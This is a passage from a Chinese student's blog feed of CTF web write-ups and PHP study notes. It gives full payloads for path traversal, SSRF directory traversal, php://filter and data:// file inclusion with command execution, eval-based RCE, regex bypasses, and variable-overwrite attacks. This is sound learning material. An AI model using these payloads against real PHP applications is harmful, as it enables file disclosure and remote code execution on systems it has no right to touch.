</p><blockquote><p>file=source.php?/../ffffllllaaaagggg</p></blockquote><p>那么再经过变换后得到的结果是source.php。正好可以符合白名单。<br>那么接下来就是进行目录穿越了。我们可以构造以下payload。  </p><blockquote><p>?file=source.php?/../../../../ffffllllaaaagggg</p></blockquote><p>注意../数量要够，否则没法到flag那个目录。<br><img src="https://s3.ax1x.com/2021/01/15/s0aUQs.md.png" alt="s0aUQs.md.png">  </p><hr><p>再看第三个判断。  </p><pre><code>            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            echo &quot;you can&#39;t see it&quot;;            return false;        &#125;  </code></pre><p>可以看出它多了一个urldecode()函数。也就是将url编码解码，因为当我们输入url后上传时，会自动解码一次。所以说如果我们将“？”连续url编码两次，那么在经过urldecode()函数后就又变成了？这样也可以绕过白名单，所以构造以下payload。  </p><blockquote><p>?file=hint.php%253f/../../../../../ffffllllaaaagggg</p></blockquote><p>同样得到flag。  </p>]]></content>
      
      
      <categories>
          
          <category> test4 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web第二周练习ssrf1</title>
      <link href="test3/undefined-undefined.html"/>
      <url>test3/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>本周第三道题目可以说是一波三折。  </p><h1 id="SSRF1"><a href="#SSRF1" class="headerlink" title="SSRF1"></a>SSRF1</h1><p>打开题目看到这样的代码<br><img src="https://s3.ax1x.com/2020/12/06/DO4JXQ.md.png" alt="DO4JXQ.md.png"><br>因为题目是SSRF，所以第一时间先去了解了SSRF的相关知识（详细的以后再写一篇博客）<br>简单来说如图<br><img src="https://s3.ax1x.com/2020/12/06/DO5SgS.md.png" alt="DO5SgS.md.png"><br>代码的第一个正则匹配就是对url的验证，它要求url里必须有<strong>dotnet.com</strong>这一字符串才能进行接下来的代码，也就是说才能访问内部系统。（dotnet.com也就相当于内网网址） </p><p>又因为代码最后给出解释flag在“/flag”里，这是一个目录，所以很容易就想到使用file://伪协议来读取网站下的文件，但是可以看到第二个正则匹配过滤掉了所有的php伪协议，并且不能使用大小写绕过，只给出了一个file _get _contents()函数，所以明显要从这个函数下手。  </p><p>但是从菜鸟教程得到的file _get _contents()函数的解释却很少，<br><img src="https://s3.ax1x.com/2020/12/06/DO5H2T.md.png" alt="DO5H2T.md.png"><br>对绕过这个正则函数好像没有什么用，于是又去网上搜索关于file _get _contents()函数的用法，但是搜到的最多只有它和伪协议php://input来搭配使用，依然没办法绕过这个正则函数。  </p><p>正当我正发愁时，终于发现了file _get _contents()函数的另一个用法</p><blockquote><p>当PHP的 file _get _contents() 函数在遇到不认识的伪协议头时候会将伪协议头当做文件夹，造成目录穿越漏洞</p></blockquote><p>ohhhhhhhhhhhhh!!!<br>也就是说如果我们构造一个不存在的伪协议头的话，这个伪协议头就会成为一个目录的名称（如<strong>0://dotnet.com</strong>就会被当成目录），这样的话就相当于我们访问了这个网站的这个目录，我们只需不断向上跳转到根目录就能得到flag的文件，于是我构造了以下payload  </p><blockquote><p>?url=0://dotnet.com/../../../../../flag</p></blockquote><p>注意向上跳转的次数一定要够，否则就跳不到根目录。<br>最后就可以得到flag<br><img src="https://s3.ax1x.com/2020/12/06/DOI4yD.md.png" alt="DOI4yD.md.png"></p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题其实总体来说并没有考到对ssrf的绕过方式（刚开始我以为是要绕过正则匹配到内网），这道题重点是在file _get _contents()函数，如何利用这个函数来绕过对伪协议的过滤，进行目录穿越。如果不知道这个函数还有这种用法，估计会卡死在伪协议的过滤上。</p>]]></content>
      
      
      <categories>
          
          <category> test3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二周习题1</title>
      <link href="test2/undefined-undefined.html"/>
      <url>test2/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>做了平台上更新的两道题，现在写一下做题思路。  </p><h1 id="php伪协议1"><a href="#php伪协议1" class="headerlink" title="php伪协议1"></a>php伪协议1</h1><p>打开题目，得到以下代码<br><img src="https://s3.ax1x.com/2020/12/03/DHp5Cj.md.png" alt="DHp5Cj.md.png"><br>由include()函数可以知道这是一道文件包含题，可以使用php伪协议来做，但是发现源代码里有一个正则函数，过滤了所有php伪协议相关的字符串。那么是不是就不能用伪协议了呢？并不是这样的。<br>再仔细观察这个函数的语法，发现它并没有区分要匹配的字符串的大小写（语法是/i）。也就是说如果我们传入Php这样的字符串的时候是不会被过滤掉的。而get传入并不区分大小写。所以有大写的伪协议同样有效。于是我们便可以利用大小写来绕过这个函数。  </p><hr><p><strong>关于正则表达式的详细语法</strong><br><a href="https://www.runoob.com/regexp/regexp-syntax.html">正则表达式语法</a>  </p><hr><p>我构造的payload如下  </p><blockquote><p>?file=Php://filter/read=convert.Base64-encode/resource=flag</p></blockquote><p>从而得到base64编码过的flag文件<br><img src="https://s3.ax1x.com/2020/12/03/DHPiND.md.png" alt="DHPiND.md.png"><br>再解码就可以得到flag<br>随后又尝试了data://等协议，但是没有效果，不知道原因是什么。  </p><h1 id="php伪协议2"><a href="#php伪协议2" class="headerlink" title="php伪协议2"></a>php伪协议2</h1><p>打开题目，代码如下<br><img src="https://s3.ax1x.com/2020/12/03/DHPQUS.md.png" alt="DHPQUS.md.png"><br>这道题和上一道很像，但是匹配加上了不区分大小写这一条件，利用大小写绕过就不能再用了，这时又注意到一个新函数str_replace()，关于这个函数我在另一篇博客讲过了<br><a href="https://george186.github.io/test1/undefined-undefined.html">关于str_replace()函数</a><br>简单来说，就是它会搜索字符串里的<strong>troye</strong>这个字符串然后将其删除，这正好为我们提供了一个绕过方法，如果我们传入以下字符  </p><blockquote><p>phtroyep://filter/……..</p></blockquote><p>那么它不仅可以绕过第一个正则匹配，而且最终会变成以下字符串  </p><blockquote><p>php://filter/……..</p></blockquote><p>这样既绕过了正则函数，又使最后传入的是伪协议，从而达到读取flag的目的。于是我们构造以下payload  </p><blockquote><p>?file=ptroyehp://filter/read=convert.btroyease64-encode/resource=flag</p></blockquote><p>便可以得到base64编码过的flag，再解码就可以了。<br><img src="https://s3.ax1x.com/2020/12/03/DHi3dK.md.png" alt="DHi3dK.md.png">  </p><hr><p>这两道题是将正则函数绕过和php伪协议放在一起考了，比起单单只用伪协议要难一些。以后的ctf中应该都是这种多个方面在一起考查，所以不能只会一个方面的东西，知识面要广。</p>]]></content>
      
      
      <categories>
          
          <category> test2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界练习---伪协议</title>
      <link href="test1/undefined-undefined.html"/>
      <url>test1/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>做了一道关于伪协议的题，较本周的另两道简单，算是巩固一下关于伪协议的知识<br>打开地址得到以下源代码<br><img src="https://s3.ax1x.com/2020/12/02/DoJ5WR.md.png" alt="DoJ5WR.md.png"><br>有include()函数，可以知道是一道文件包含漏洞题，可以使用php伪协议来解决。（关于文件包含漏洞问题之后再进行总结）<br>再看到有这样一个函数  </p><blockquote><p>str_replace(“php://“, “”, $page);</p></blockquote><p>于是了解一下这个函数<br><img src="https://s3.ax1x.com/2020/12/02/DotOGd.md.png" alt="DotOGd.md.png"><br>可以知道，该函数会匹配get传参的字符串中的php://这个字符串，并将其替换成空格，等于过滤了这个字符串。所以我们不能直接使用php://协议。但是可以使用其他协议，我使用了data://协议。<br>该协议可以用该协议传递相应格式的数据。通常可以用来执行php代码<br>因此我们可以先构造payload来读取文件目录  </p><blockquote><p>?page=data://text/plain,<?php system('ls');?></p></blockquote><p>得到文件目录<br><img src="https://s3.ax1x.com/2020/12/02/DoNtL6.md.png" alt="DoNtL6.md.png"><br>可以知道包含flag的文件，接着使用命令执行函数读出该文件内容就可以得到flag<br><img src="https://s3.ax1x.com/2020/12/02/DoNDWd.md.png" alt="DoNDWd.md.png">  </p><hr><p>当然这道题还有别的解法,str_replace()函数默认情况下识别是分大小写的，所以我们可以通过大小写绕过这个函数，当我们知道包含flag的文件名后，利用大小写可以构造以下payload来绕过  </p><blockquote><p>?page=Php://filter/read=convert.base64-encode/resource=fl4gisisish3r3.php</p></blockquote><p>得到base64编码过的php文件，再解码就可以得到flag</p>]]></content>
      
      
      <categories>
          
          <category> test1 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP伪协议笔记</title>
      <link href="note2/undefined-undefined.html"/>
      <url>note2/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>本周学习了关于PHP的伪协议相关知识，现在做一下总结<br>先给出我学习的网址<br><a href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结</a><br><a href="https://www.freebuf.com/column/148886.html">php伪协议实现命令执行的七种姿势</a><br>PHP伪协议包括file://、php://filter、php://input、zip://、compress.bzip2://、compress.zlib://、data://。下面介绍常用的几个  </p><h1 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h1><p>file://协议在双off的情况下也可以正常使用<br>allow_url_fopen ：off/on<br>allow_url_include：off/on<br>file://协议用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow _url _fopen与allow _url _include的影响。<br>使用方法<br>file:// [文件的绝对路径和文件名]  </p><blockquote><p><a href="http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt">http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt</a>  </p></blockquote><p>file:// [文件的相对路径和文件名]  </p><blockquote><p><a href="http://127.0.0.1/include.php?file=./phpinfo.txt">http://127.0.0.1/include.php?file=./phpinfo.txt</a>  </p></blockquote><p>http://网络路径和文件名  </p><blockquote><p><a href="http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</a>  </p></blockquote><h1 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h1><p>这个是我目前用到最多的，它包括php://filter、php://input、 php://stdin、 php://memory 和 php://temp,不需要开启allow _url _fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow _url _include。<br>其中php://filter和php://input使用较多<br><img src="https://s3.ax1x.com/2020/12/02/Do1AuF.md.png" alt="Do1AuF.md.png">  </p><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>该协议用于读取源码<br><img src="https://s3.ax1x.com/2020/12/02/Do1GHH.md.png" alt="Do1GHH.md.png"><br><a href="http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=%5B%E6%96%87%E4%BB%B6%E5%90%8D%5D%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E6%BA%90%E7%A0%81%EF%BC%88%E9%92%88%E5%AF%B9php%E6%96%87%E4%BB%B6%E9%9C%80%E8%A6%81base64%E7%BC%96%E7%A0%81%EF%BC%89">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）</a>  </p><blockquote><p><a href="http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=flag.php">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=flag.php</a></p></blockquote><h2 id="php-input-POST-DATA-执行php代码"><a href="#php-input-POST-DATA-执行php代码" class="headerlink" title="php://input+[POST DATA]执行php代码"></a>php://input+[POST DATA]执行php代码</h2><p>php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。  </p><blockquote><p><a href="http://127.0.0.1/cmd.php?file=php://input">http://127.0.0.1/cmd.php?file=php://input</a><br>[POST DATA] <?php phpinfo()?></p></blockquote><h1 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h1><p>使用条件allow _url _fopen ：on<br>allow _url _include：on<br>可以用该协议传递相应格式的数据。通常可以用来执行php代码<br>data://text/plain，<br>data://text/plain；base64，  </p><blockquote><p><a href="http://127.0.0.1/cmd.php?file=data://text/plain">http://127.0.0.1/cmd.php?file=data://text/plain</a>,<?php phpinfo()?></p><p><a href="http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p></blockquote><p>关于zip://、compress.bzip2://、compress.zlib://这三个协议目前还没有遇到相关题目，以后遇到再总结更新</p>]]></content>
      
      
      <categories>
          
          <category> note2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP中foreach函数笔记</title>
      <link href="note1/undefined-undefined.html"/>
      <url>note1/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>本周做的题目中有一道变量覆盖问题，其中用到了foreach()函数，当时看到别人对这个函数的解释并没有很懂，于是自己又通过查找又了解一下这个函数用法，现在把自己的理解写出来。  </p><h1 id="foreach-函数—-关于-key的值"><a href="#foreach-函数—-关于-key的值" class="headerlink" title="foreach()函数—-关于$key的值"></a>foreach()函数—-关于$key的值</h1><p>先附上我学习这个函数的链接<br><a href="https://blog.csdn.net/qq_39388484/article/details/82839903">详解PHP中foreach的用法和实例</a><br><strong>foreach</strong>有两种语法<br>第一种：遍历给定的 数组语句 array_expression 数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。</p><blockquote><p>foreach (array_expression as $value)</p></blockquote><p>第二种：同上，同时当前单元的键名也会在每次循环中被赋给变量 $key。  </p><blockquote><p>foreach (array_expression as $key =&gt; $value)</p></blockquote><p>这个函数是要和数组搭配起来使用的，下面讲解一下基本的用法  </p><h2 id="一维数组与foreach"><a href="#一维数组与foreach" class="headerlink" title="一维数组与foreach"></a>一维数组与foreach</h2><p>列出一个一维数组<br>    $a = array(‘Tom’,’Mary’,’Peter’,’Jack’);<br>用第一种方法来输出<br>    foreach ($a as $value) {<br>    echo $value.”<br/>“;<br>    }<br>最后得到的结果是Tom，Mary，Peter，Jack<br>用第二种方法来输出  </p><pre><code>foreach ($a as $key =&gt; $value) &#123;  echo $key.&#39;,&#39;.$value.&quot;&lt;br/&gt;&quot;;&#125;  </code></pre><p>得到的结果是<br>0,Tom<br>1,Mary<br>2,Peter<br>3,Jack<br>很明显看到多了$key这个$key的值就是序号0，1，2，3等等<br>但是在题目中有这样一串代码<br>    $$key=$$value<br>当我传入?_200=flag后，结果变成了$ _200=$flag,这时的$key值不再是序号0，1，2，3······而是变成了 _200,这是为什么呢，我在一维关联数组中找到了类似变化  </p><h2 id="一维关联数组与foreach"><a href="#一维关联数组与foreach" class="headerlink" title="一维关联数组与foreach"></a>一维关联数组与foreach</h2><p>如下<br>    $b = array(‘a’=&gt;’Tom’,’b’=&gt;’Mary’,’c’=&gt;’Peter’,’d’=&gt;’Jack’);<br>这时我们再用第一种方法输出结果和上面的相同<br>但是用第二种方式输出则发生变化  </p><pre><code>foreach ($b as $key =&gt; $value) &#123;  echo $key.&#39;,&#39;.$value;&#125;  </code></pre><p>最后得到的结果是：<br>a,Tom<br>b,Mary<br>c,Peter<br>d,Jack<br>很明显，这时候的key值已经变成了关联的序号，也就是a,b,c,····<br>于是我推测，当我们使用post，get方式进行传参的时候，传入的就是一维关联数组，例如上面所讲到的?_ 200=flag就相当于’_ 200’=&gt;’flag’，这样一来，得到的最后结果就变成了$ _200=$flag，$key的值也就发生了变化，最终将flag传入到了变量$ _200中。  </p><hr><p>关于foreach还能和二维数组练习，但是key的值一般不会变化，依旧是序号0，1，2·····更多相关知识还是在分享的链接里查找吧。</p>]]></content>
      
      
      <categories>
          
          <category> note1 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一周学习报告</title>
      <link href="note/undefined-undefined.html"/>
      <url>note/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>本周学习可以说是一路艰辛  </p><h2 id="搭建博客"><a href="#搭建博客" class="headerlink" title="搭建博客"></a>搭建博客</h2><p>搭建博客使用hexo+github好处多多—-<strong>前提是不报错</strong><br>分享一个搭建博客教学链接<br><a href="">https://www.simon96.online/2018/10/12/hexo-tutorial/</a><br>网上一般都有有报错解决办法，但是有的还是要靠自己摸索<br>下面分享一个我遇到的最坑问题<br>当所有过程都没问题后却发现自己网上博客一片空白（本地博客）没有问题，提供以下解决办法<br><a href="https://imgchr.com/i/D607F0"><img src="https://s3.ax1x.com/2020/11/28/D607F0.md.png" alt="D607F0.md.png"></a><br>将GitHub page路径改成master，因为我上传的文件路径都是master，但是它默认的路径是main，所以出现没有报错但是网上博客一片空白的情况。<br>这个坑卡了我好几天，甚至还删了充搭了一次。。。。。。  </p><h2 id="上传文章"><a href="#上传文章" class="headerlink" title="上传文章"></a>上传文章</h2><p>这个出问题自求多福不是玄学问题吧，实在不行换主题。（说多都是泪）  </p><hr><h2 id="web学习笔记"><a href="#web学习笔记" class="headerlink" title="web学习笔记"></a>web学习笔记</h2><h3 id="命令执行函数和eval-函数"><a href="#命令执行函数和eval-函数" class="headerlink" title="命令执行函数和eval()函数"></a>命令执行函数和eval()函数</h3><p>eval()函数能将输入的字符串当作PHP代码来执行，这就很容易造成漏洞，下面是本周做的题目中的一个例子  </p><blockquote><p>eval($_GET[‘a’]);</p></blockquote><p>很明显，这串代码相当于一个后门，只要你用get传参传入一串可执行的PHP代码就可以执行这串代码，注意结尾要加“；”。<br>命令执行函数常见的有以下几种<br>1、system<br>string system(string command,int &amp;return_var)</p><p>可以用来执行系统命令并将相应的执行结果输出</p><p>2、exec<br>string exec(string command,array &amp;outpub,int &amp;return_var)</p><p>command是要执行的命令，output是获得执行命令输出的每一行字符串，return_var存放执行命令后的状态值。</p><p>注意：exec输出的是命令执行结果的最后一行内容。如果你需要获取未经处理的全部输出数据，请使用passthru()函数。</p><p>如果想要获取命令的输出内容，请确保使用output参数。</p><p>3、passthru<br>void passthru(string command, int &amp;return_var)</p><p>command是要执行的命令，return_var存放执行命令后的状态值。</p><p>4、 shell_exec<br>string shell_exec(string command)</p><p>command是要执行的命令<br>我现在比较了解的就是system()函数，可以用的命令有很多这些命令和Linux里的命令相似  </p><blockquote><p>cat 一次显示整个文件  </p><p>tac 是将cat反过来写，所以他的功能和cat相反，cat是由第一行到最后一行连续显示在萤幕上，而 tac 则是由最后一行到第一行反向在萤幕上显示出来。</p><p>more  会以一页一页的显示方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页<br>显示，而且还有搜寻字串的功能 。但是在网页上好像不能翻页。 </p><p>less  与 more 类似，但使用 less 可以随意浏览文件使用[pageup] [pagedown] 等按键，而 more 仅能向后移动，却不能向前移动，而且 less 在查看之前不会加载整个文件。同样网页端好像不能翻页。</p></blockquote><p>介绍完eval()和命令执行函数后可以感觉到我们可以使用这一漏洞来查看，修改web服务器里的文件。所以在题目中我构造  </p><blockquote><p>/?a=system(‘ls’);<br>和  </p><blockquote><p>/?a=system(‘tac f111a9.php’);</p></blockquote></blockquote><p>便可以读出其中文件内容。  </p><h3 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h3><p>eval()虽然好用，但是遇上正则函数便失去作用，正则函数会过滤掉一些字符串，比如cat，tac等，这样就没有办法像一般那样直接传入函数命令，所以要绕过正则函数来上传。这里附上别人的总结<br><a href="https://blog.csdn.net/mochu7777777/article/details/104631142/">关于PHP正则匹配后代码执行的一些绕过方法</a><br>其中可以采取异或绕过，取反绕过，换行符绕过，利用正则回溯次数限制的绕过<br>这里介绍目前我能理解的两种绕过<br><strong>换行符绕过</strong><br>preg_match()函数只能匹配一行字符串，所以使用换行符%0a就可以绕过它的匹配<br><strong>url编码取反绕过</strong><br>这是取反绕过中最简单的一种绕过，该方法只适用于PHP7<br>对于想要传入的参数，先进行url编码再取反<br>例如传入构造一个phpinfo()；<br>只需要将phpinfo取反编码就行<br>如果需要执行有参数的函数，比如system(“ls”);<br>需要分别对system和ls进行取反，分别得到  </p><blockquote><p>%8C%86%8C%8B%9A%92 </p><p>%93%8C</p></blockquote><p>构建payload/?(<del>%8C%86%8C%8B%9A%92)(</del>%93%8C)；就可以绕过正则函数<br>其他的异或绕过和取反绕过以及利用回溯次数绕过需要用到脚本，等我变强了再来讨论吧hhhhh  </p><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>附上学习的链接<br><a href="https://blog.csdn.net/qq_41381461/article/details/90047616">php变量覆盖</a><br>先总结我目前遇到的两种<br><strong>extract()函数变量覆盖</strong><br><a href="https://www.runoob.com/php/func-array-extract.html">菜鸟教程关于extract的讲解</a><br>总的来说extract()函数在默认情况下，会将传入的变量的值覆盖原有的变量的值，如以下代码<br>&lt;?php  </p><blockquote><p>$id=1;<br>extract($_GET);<br>echo $id;<br>?&gt;<br>//提交：?id=123<br>//结果： 123</p></blockquote><p>所以可以将原本不知道的变量的值进行覆盖，使其成为我们传入的值，对于  </p><blockquote><p>if($liwu==$flag) {<br>        echo’flag{xxxxxxxxxxx}’;</p></blockquote><p>这类代码漏洞十分有用。<br>**$$导致的变量覆盖问题**<br>在PHP中$$表示的是一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。如以下代码<br>&lt;?php  </p><blockquote><p>$c=’hello’;<br>$$c=’world’;<br>echo $c;<br>echo $$c;<br>?&gt;</p></blockquote><p>得到的结果是helloworld，也就是说将$c作为一个变量名进行赋值，从而覆盖了原来的$c=hello。<br>而使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。<br>&lt;?php  </p><blockquote><p>$id=5;<br>foreach ($_GET as $key =&gt; $value) {<br>$$key = $value;<br>}<br>echo $a;<br>?&gt;</p></blockquote><p>如果如果get传的是?id=1，那么，经过$$key=$value之后，就会变成$id=1，覆盖掉原来的$id=5。<br>如果代码如下<br>&lt;?php  </p><blockquote><p>$id=5;<br>foreach ($_GET as $key =&gt; $value) {<br>$$key = $$value;<br>}<br>echo $a;<br>?&gt;  </p></blockquote><p>那么如果get传入的是?id=flag,经过$$key = $$value之后就会变成$id=$flag，此时$flag里面的值，也就是flag已经被写入$id当中了。以上两组代码结合起来便可以实现  </p><blockquote><p>$_POST[“flag”] == $flag</p></blockquote><p>这样的要求<br>关于foreach()细节以后再另写笔记说。（因为写到这已经是凌晨一点半了。。。。。）  </p>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web第一周练习</title>
      <link href="test/undefined-undefined.html"/>
      <url>test/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>  第一周的web一共做了四道题，现在写下做题思路，以便日后回顾。</p><h1 id="一，basic-rec"><a href="#一，basic-rec" class="headerlink" title="一，basic rec"></a>一，basic rec</h1><p>打开题目地址，得到如下代码。<br><img src="https://s3.ax1x.com/2020/11/28/D6NtTf.md.png" alt="D6NtTf.md.png"><br>真正有用的函数只有一个</p><blockquote><p>eval($_GET[‘a’]);</p></blockquote><p>于是立刻学习关于eval函数的相关用法和知识<br>这是从菜鸟教程上得知的eval()函数的用法  </p><blockquote><p>eval() 函数把字符串按照 PHP 代码来计算。<br>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p></blockquote><p>所以可以看成这个网页已经被上传了一个木马，只要我们以get请求方式上传以下形式的字符到变量a，就能将被上传的字符串按照PHP代码来执行  </p><blockquote><p>/?a=”一串PHP代码”；（结尾要有分号才能执行该代码）</p></blockquote><p>但是该上传什么样的PHP代码呢，因为我要找到flag，所以要查看该网页服务器下有flag的文件，所以选用执行系统命令函数，该函数有以下几种system()passthru()exec()shell_exec()popen()proc_open()<br>pcntl_exec()，我选用的是system()函数<br>system()函数执行有回显，会将结果输出到页面上  </p><blockquote><p>string system ( string $command [, int &amp;$return_var ])</p></blockquote><p>$command是执行的命令，[]里的可选可不选，可以执行的命令与Linux中相似，有ls，cat，tac，more，less，等其中ls是显示文件目录，cat，tac等都是查看文件内容的命令，首先我查看文件目录，于是输入以下命令  </p><blockquote><p>/?a=system(‘ls’);</p></blockquote><p>得到文件目录<br><a href="https://imgchr.com/i/D6NrXn"><img src="https://s3.ax1x.com/2020/11/28/D6NrXn.md.png" alt="D6NrXn.md.png"></a><br>知道flag在f111a9.php中，接着便读取出该文件内容  </p><blockquote><p>/?a=system(‘tac f111a9.php’);</p></blockquote><p>得到flag。<br><a href="https://imgchr.com/i/D6NRtU"><img src="https://s3.ax1x.com/2020/11/28/D6NRtU.md.png" alt="D6NRtU.md.png"></a></p><h1 id="二，PHP变量覆盖"><a href="#二，PHP变量覆盖" class="headerlink" title="二，PHP变量覆盖"></a>二，PHP变量覆盖</h1><p>打开题目地址得到如下代码<br><a href="https://imgchr.com/i/D6Nhp4"><img src="https://s3.ax1x.com/2020/11/28/D6Nhp4.md.png" alt="D6Nhp4.md.png"></a>  </p><p>这道题目的重点是extrace()函数<br>extrace()将从数组中将变量导入到当前符号表，默认的是如果变量冲突，则覆盖已有的变量<br>知道这个函数后再对代码进行审计  </p><blockquote><p>$flag=’xxxxxxxx’;<br>extract($_GET); //以get传参的值会进过extract()函数<br>if(isset($liwu)) { //判断是否设立了$liwu该变量<br>    $content=trim(file_get_contents($flag)); //读取$flag的变量并将它赋给$content变量<br>    if($liwu==$content) {<br>        echo’flag{xxxxxxxxxxx}’; //如果$liwu和$content这两个变量相等就输出flag<br>    }<br>    else {<br>        echo ‘please try other operation.’;<br>    }<br>}  </p></blockquote><p>因为我不知道flag是什么，所以正常情况下不可能使$content这个变量等于$flag来得到真正的flag，所以我使用extrace()函数当传参时将$flag原来的值覆盖，这样就可以让这两个变量相等，从而得到flag。于是构造以下形式  </p><blockquote><p>/?$liwu=&amp;$flag=</p></blockquote><p>这样我们将$flag=空的值覆盖了原来的flag的值，从而使$liwu=$flag得到真正的flag。<br><a href="https://imgchr.com/i/D6NIXR"><img src="https://s3.ax1x.com/2020/11/28/D6NIXR.md.png" alt="D6NIXR.md.png"></a><br>但是不知道为什么构造/?$liwu=123&amp;$flag=123这样的不行。  </p><h1 id="三，basic-rce2"><a href="#三，basic-rce2" class="headerlink" title="三，basic rce2"></a>三，basic rce2</h1><p>代码如下<br><a href="https://imgchr.com/i/D6Uk4S"><img src="https://s3.ax1x.com/2020/11/28/D6Uk4S.md.png" alt="D6Uk4S.md.png"></a><br>这道题目和第一题本质差别不大，都是要用到执行系统命令函数，但是可以看出多了一个preg_match()函数。这是一个正则表达式函数，这个函数可以匹配查字符串中的所要搜索的字符，从题目函数可以看出，他规定了以下字符串<br>more，less，flag，head，nl，tail，tac，cat，rm，cp，mv，*，{<br>也就是说，如果我get传参的字符串中有这些字符串就会被返回，也就是不能执行所传代码，所以说不能像第一题那样直接输入/?Rem=system(‘cat xxxx’);来查看文件，但是还是可以来查看文件目录的，（没规定ls这个字符）<br><a href="https://imgchr.com/i/D6Unun"><img src="https://s3.ax1x.com/2020/11/28/D6Unun.md.png" alt="D6Unun.md.png"></a><br>得到有flag的文件。<br>下一步便是如何绕过这个匹配，这里我选择了取反绕过（换行绕过没成功，应该是掌握的有点问题）也就是将命令 ‘cat flag index.php’取反后再进行url编码再构造/?Rem=system(~xxxxxxxxx);即可绕过关于cat flag的匹配。<br>‘cat flag index.php’取反编码如下  </p><blockquote><p>%27%9C%9E%8B%DF%99%93%9E%98%DF%96%91%9B%9A%87%D1%8F%97%8F%27</p></blockquote><p>构造payload后传参便得到flag<br><a href="https://imgchr.com/i/D6UuBq"><img src="https://s3.ax1x.com/2020/11/28/D6UuBq.md.png" alt="D6UuBq.md.png"></a>  </p><h1 id="四，PHP变量覆盖2"><a href="#四，PHP变量覆盖2" class="headerlink" title="四，PHP变量覆盖2"></a>四，PHP变量覆盖2</h1><p>代码如下<br><a href="https://imgchr.com/i/D6UG34"><img src="https://s3.ax1x.com/2020/11/28/D6UG34.md.png" alt="D6UG34.md.png"></a><br>这次函数变成了foreach()同时多了一个$$这样的字符，而$$是这道题目的关键。<br>$$abc表示对$abc这个变量进行赋值，<br>而使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。<br>所以这道题要利用这两个foreach函数来使上传的参数flag等于$flag，进而得到flag。<br>通过代码最后一行可以知道我们要将$flag里的值赋予$_200最后才能输出flag。于是利用第一个foreach函数来构造paylod  </p><blockquote><p>/?_200=flag</p></blockquote><p>这样的结果是$$_200=$$flag,也就是将原来$_200的值覆盖成$flag里的值，也就是真正的flag。<br>接着使用第二个foreach函数来构造payload使我post传过去的flag=$flag,进而打印出$_200,于是构造以下payload  </p><blockquote><p>flag=aaaaaaaaa</p></blockquote><p>这样的结果是$$flag=aaaaaaaaa，也就是将原来$flag里的值覆盖成aaaaaaaaa，这样我们上传的参数flag一定等于$flag，而真正的flag已经被赋予$_200,最后打印出真正的flag。<br><a href="https://imgchr.com/i/D6UaHx"><img src="https://s3.ax1x.com/2020/11/28/D6UaHx.md.png" alt="D6UaHx.md.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
